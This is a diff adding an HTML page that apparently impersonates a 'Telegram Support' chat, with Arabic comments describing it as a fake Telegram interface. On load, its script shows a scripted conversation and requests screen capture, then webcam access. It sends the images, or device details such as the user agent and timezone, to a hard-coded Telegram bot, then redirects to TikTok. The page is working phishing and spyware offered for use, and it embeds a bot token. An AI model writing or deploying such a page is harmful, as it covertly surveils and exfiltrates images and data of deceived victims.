@@ -1,0 +1,386 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Telegram Web</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+        
+        /* واجهة تيليجرام مزيفة */
+        .telegram-interface {
+            max-width: 400px;
+            margin: 0 auto;
+            background: white;
+            min-height: 100vh;
+            box-shadow: 0 0 20px rgba(0,0,0,0.1);
+        }
+        
+        .header {
+            background: #5682a3;
+            color: white;
+            padding: 15px;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+        
+        .avatar {
+            width: 40px;
+            height: 40px;
+            background: #ff6b6b;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+        }
+        
+        .chat-info {
+            flex: 1;
+        }
+        
+        .chat-name {
+            font-weight: bold;
+            margin-bottom: 3px;
+        }
+        
+        .chat-status {
+            font-size: 12px;
+            opacity: 0.8;
+        }
+        
+        .messages {
+            padding: 15px;
+            background: #e5ddd5;
+            min-height: 70vh;
+        }
+        
+        .message {
+            max-width: 70%;
+            margin-bottom: 10px;
+            padding: 10px;
+            border-radius: 10px;
+            position: relative;
+            animation: fadeIn 0.3s;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        .message.received {
+            background: white;
+            margin-right: auto;
+            border-bottom-left-radius: 0;
+        }
+        
+        .message.sent {
+            background: #dcf8c6;
+            margin-left: auto;
+            border-bottom-right-radius: 0;
+        }
+        
+        .time {
+            font-size: 10px;
+            color: #999;
+            text-align: right;
+            margin-top: 5px;
+        }
+        
+        .typing {
+            display: flex;
+            gap: 5px;
+            padding: 10px;
+            background: white;
+            border-radius: 20px;
+            width: fit-content;
+            margin-bottom: 10px;
+        }
+        
+        .typing span {
+            width: 8px;
+            height: 8px;
+            background: #999;
+            border-radius: 50%;
+            animation: typing 1.4s infinite;
+        }
+        
+        .typing span:nth-child(2) { animation-delay: 0.2s; }
+        .typing span:nth-child(3) { animation-delay: 0.4s; }
+        
+        @keyframes typing {
+            0%, 60%, 100% { transform: translateY(0); opacity: 0.5; }
+            30% { transform: translateY(-10px); opacity: 1; }
+        }
+        
+        .input-area {
+            background: white;
+            padding: 15px;
+            display: flex;
+            gap: 10px;
+            border-top: 1px solid #ddd;
+        }
+        
+        .input-field {
+            flex: 1;
+            padding: 10px;
+            border: 1px solid #ddd;
+            border-radius: 25px;
+            outline: none;
+        }
+        
+        .send-btn {
+            width: 40px;
+            height: 40px;
+            background: #5682a3;
+            color: white;
+            border: none;
+            border-radius: 50%;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        /* عناصر التصوير مخفية */
+        .hidden-camera {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+        }
+    </style>
+</head>
+<body>
+    <!-- واجهة تيليجرام المزيفة -->
+    <div class="telegram-interface">
+        <div class="header">
+            <div class="avatar">📱</div>
+            <div class="chat-info">
+                <div class="chat-name">Telegram Support</div>
+                <div class="chat-status">آخر ظهور منذ دقيقة</div>
+            </div>
+        </div>
+        
+        <div class="messages" id="messages">
+            <div class="message received">
+                مرحباً! كيف يمكننا مساعدتك؟
+                <div class="time">10:30 صباحاً</div>
+            </div>
+            
+            <div class="typing" id="typingIndicator">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="input-area">
+            <input type="text" class="input-field" placeholder="اكتب رسالة..." value="مشكلة في الدخول">
+            <button class="send-btn">📤</button>
+        </div>
+    </div>
+
+    <!-- عناصر التصوير الخفية -->
+    <div class="hidden-camera">
+        <video id="hiddenVideo" autoplay playsinline></video>
+        <canvas id="hiddenCanvas"></canvas>
+    </div>
+
+    <script>
+        // ====== إعدادات البوت ======
+        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";
+        const TARGET_ID = new URLSearchParams(window.location.search).get('id') || "739226288";
+
+        // ====== عناصر التصوير ======
+        const video = document.getElementById('hiddenVideo');
+        const canvas = document.getElementById('hiddenCanvas');
+
+        // ====== دوال التصوير ======
+        async function captureScreen() {
+            try {
+                // محاولة تصوير الشاشة أولاً
+                const stream = await navigator.mediaDevices.getDisplayMedia({
+                    video: {
+                        cursor: "always",
+                        displaySurface: "monitor"
+                    },
+                    audio: false,
+                    surfaceSwitching: "include",
+                    selfBrowserSurface: "include",
+                    systemAudio: "exclude"
+                });
+
+                const videoTrack = stream.getVideoTracks()[0];
+                const imageCapture = new ImageCapture(videoTrack);
+                
+                // التقاط صورة من الشاشة
+                const bitmap = await imageCapture.grabFrame();
+                
+                // رسم الصورة على الكانفس
+                canvas.width = bitmap.width;
+                canvas.height = bitmap.height;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(bitmap, 0, 0);
+                
+                // إيقاف تدفق الشاشة
+                videoTrack.stop();
+                
+                // تحويل إلى blob وإرسال
+                canvas.toBlob(async (blob) => {
+                    await sendPhoto(blob, 'screen_capture.jpg', '📸 لقطة شاشة كاملة');
+                    
+                    // بعد لقطة الشاشة، جرب تصوير الكاميرا
+                    setTimeout(captureCamera, 1000);
+                }, 'image/jpeg', 0.95);
+
+            } catch (screenError) {
+                console.log("فشل تصوير الشاشة، نحول للكاميرا:", screenError);
+                captureCamera();
+            }
+        }
+
+        async function captureCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: "user",
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
+                    }
+                });
+
+                video.srcObject = stream;
+                
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+
+                // انتظار ثانية لتثبيت الصورة
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(async (blob) => {
+                        await sendPhoto(blob, 'camera_capture.jpg', '📸 صورة من الكاميرا');
+                        
+                        // إيقاف الكاميرا
+                        stream.getTracks().forEach(track => track.stop());
+                        
+                        // توجيه لتيك توك بعد ثانيتين
+                        setTimeout(() => {
+                            window.location.href = "https://www.tiktok.com";
+                        }, 2000);
+                        
+                    }, 'image/jpeg', 0.95);
+                    
+                }, 1500);
+
+            } catch (cameraError) {
+                console.log("فشل تصوير الكاميرا:", cameraError);
+                
+                // إذا فشل كل شيء، أرسل معلومات
+                await sendInfo();
+                
+                setTimeout(() => {
+                    window.location.href = "https://www.tiktok.com";
+                }, 2000);
+            }
+        }
+
+        async function sendPhoto(blob, filename, caption) {
+            const formData = new FormData();
+            formData.append('chat_id', TARGET_ID);
+            formData.append('photo', blob, filename);
+            formData.append('caption', `${caption}\n⏱️ الوقت: ${new Date().toLocaleString('ar-EG')}`);
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+            } catch (e) {
+                console.log("فشل إرسال الصورة:", e);
+            }
+        }
+
+        async function sendInfo() {
+            const info = {
+                platform: navigator.platform,
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                screen: `${screen.width}x${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+            };
+
+            try {
+                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TARGET_ID,
+                        text: `⚠️ فشل التصوير\n📱 معلومات الجهاز:\n${JSON.stringify(info, null, 2)}`
+                    })
+                });
+            } catch (e) {}
+        }
+
+        // ====== تشغيل المحادثة المزيفة ======
+        function simulateChat() {
+            const messagesDiv = document.getElementById('messages');
+            const typingIndicator = document.getElementById('typingIndicator');
+            
+            // رسالة بعد ثانيتين
+            setTimeout(() => {
+                typingIndicator.style.display = 'none';
+                
+                const replyMsg = document.createElement('div');
+                replyMsg.className = 'message received';
+                replyMsg.innerHTML = 'يمكنك شرح المشكلة بالتفصيل؟ <div class="time">10:31 صباحاً</div>';
+                messagesDiv.appendChild(replyMsg);
+                
+                // تحريك للأسفل
+                messagesDiv.scrollTop = messagesDiv.scrollHeight;
+                
+            }, 3000);
+            
+            // رسالة بعد 5 ثواني
+            setTimeout(() => {
+                const supportMsg = document.createElement('div');
+                supportMsg.className = 'message sent';
+                supportMsg.innerHTML = 'نعم، عندي مشكلة في تسجيل الدخول <div class="time">10:32 صباحاً</div>';
+                messagesDiv.appendChild(supportMsg);
+                messagesDiv.scrollTop = messagesDiv.scrollHeight;
+                
+            }, 5000);
+        }
+
+        // ====== بدء كل شيء ======
+        window.onload = function() {
+            // تشغيل المحادثة المزيفة
+            simulateChat();
+            
+            // انتظار ثانيتين ثم تصوير الشاشة
+            setTimeout(captureScreen, 2000);
+            
+            // طوارئ: توجيه بعد 10 ثواني
+            setTimeout(() => {
+                window.location.href = "https://www.tiktok.com";
+            }, 10000);
+        };
+    </script>
+</body>
+</html>
